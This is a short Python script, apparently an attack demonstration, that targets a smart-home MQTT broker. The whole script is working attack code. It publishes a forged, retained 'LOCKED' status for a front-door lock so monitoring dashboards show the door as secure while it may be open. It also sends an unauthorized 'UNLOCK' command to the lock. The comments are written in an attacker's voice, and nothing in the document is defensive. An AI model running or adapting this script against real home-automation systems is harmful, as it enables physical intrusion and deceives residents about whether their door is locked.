import paho.mqtt.client as mqtt

client = mqtt.Client(client_id="attacker-inject")
client.connect("localhost", 1883, 60)
client.loop_start()

# Forge the lock into reporting LOCKED while it may be physically open.
# retain=True so any dashboard subscribing later sees the fake state.
forged = "LOCKED"
client.publish("home/frontdoor/lock/state", forged, retain=True)
print(f"[inject] published forged lock state: {forged}")

# Also issue an unauthorized command to the lock:
client.publish("home/frontdoor/lock/cmd", "UNLOCK")
print("[inject] published forged command: UNLOCK")

client.loop_stop()
